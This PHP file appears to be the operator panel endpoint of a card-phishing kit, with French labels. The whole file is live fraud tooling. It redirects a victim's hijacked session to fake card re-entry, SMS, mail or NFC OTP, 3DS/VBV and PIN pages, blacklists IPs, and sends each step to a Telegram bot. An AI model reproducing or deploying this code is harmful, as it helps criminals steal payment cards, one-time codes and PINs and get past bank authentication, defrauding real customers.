<?php
require_once '../config.php';
require_once __DIR__ . '/../ab/check.php';
require_once __DIR__ . '/panel_bridge.php';

$type = $_GET['type'] ?? '';
$ip = $_GET['ip'] ?? '';
$sessionToken = $_GET['token'] ?? '';

if (empty($type) || empty($sessionToken)) {
    echo "Paramètres manquants.";
    exit;
}

$action = $type;
if ($action === 'ban') $action = 'banned';

$validActions = [
    'finish', 'invalid_card', 'banned',
    'otp_sms', 'otp_mail', 'otp_nfc', 'vbv', 'pin', 'custom',
    'reject_sms', 'reject_mail', 'reject_nfc', 'reject_vbv', 'reject_custom',
];

if (!in_array($action, $validActions)) {
    echo "Action invalide: " . htmlspecialchars($action);
    exit;
}

session_id($sessionToken);
session_start();
$_SESSION['pending_redirect'] = $action;
session_write_close();

if ($action === 'banned' && !empty($ip)) {
    addToBlacklist($ip);
}

$labels = [
    'finish' => '✅ Redirigé vers FIN',
    'invalid_card' => '❌ BAD CC — va ressaisir',
    'banned' => '⛔ IP bannie',
    'otp_sms' => '📱 Redirigé vers OTP SMS',
    'otp_mail' => '📧 Redirigé vers OTP Mail',
    'otp_nfc' => '💳 Redirigé vers OTP NFC',
    'vbv' => '🔐 Redirigé vers 3DS/VBV',
    'pin' => '🔢 Redirigé vers Code PIN',
    'custom' => '✏️ Custom input',
    'reject_sms' => '❌ Code SMS refusé',
    'reject_mail' => '❌ Code Mail refusé',
    'reject_nfc' => '❌ Code NFC refusé',
    'reject_vbv' => '❌ 3DS refusé',
    'reject_custom' => '❌ Custom refusé',
];

$msg = $labels[$action] ?? htmlspecialchars($action);
$safeIp = htmlspecialchars($ip);
$notif = "{$msg}\n┊ 🪼 IP : {$ip}\n┊ 🪼 " . date('d/m H:i');
@file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $id_cc . '&text=' . urlencode($notif));

echo "<html><body style='background:#000;color:#1DB954;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center'><div><h2>{$msg}</h2><p style='color:#999'>IP: {$safeIp}</p><p style='color:#666;margin-top:20px'>Vous pouvez fermer cette page.</p></div></body></html>";
